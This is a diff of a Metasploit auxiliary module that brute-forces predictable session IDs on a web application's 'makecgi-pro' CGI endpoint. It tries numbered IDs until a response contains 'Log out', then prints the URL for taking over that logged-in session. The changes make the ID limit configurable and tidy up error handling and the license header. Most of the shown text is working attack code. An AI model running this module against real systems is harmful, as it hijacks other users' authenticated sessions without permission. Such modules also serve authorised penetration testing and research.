@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -36,32 +36,31 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				Opt::RPORT(80),
+				OptInt.new('SID_MAX', [true, 'Maximum Session ID', 100])
 			], self.class)
 	end
 
 	def run
-		100.times do |x|
+		datastore['SID_MAX'].times do |x|
 			begin
-				print_status("Searching for a valid session ID.")
+				print_status("Trying session ID #{x.to_s}")
 
 				res = send_request_raw({
 					'uri'     => "/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}",
-					'method'  => 'GET',
+					'method'  => 'GET'
 				}, 25)
 
-				if (res.to_s =~ /Log out/)
-					print_status("Found valid session ID number #{x}!")
-					print_status("Browse to http://#{rhost}:#{rport}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x}")
+				if (res and res.to_s =~ /Log out/)
+					print_status("Found valid session ID number #{x.to_s}!")
+					print_status("Browse to http://#{rhost}:#{rport}/cgi-bin/makecgi-pro?job=show_home&session_id=#{x.to_s}")
 					break
 				end
 
 			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-				print_status("Unable to connect to #{rhost}:#{rport}.")
+				print_error("Unable to connect to #{rhost}:#{rport}")
 				break
 			rescue ::Timeout::Error, ::Errno::EPIPE
 			end
 		end
 	end
 end
-
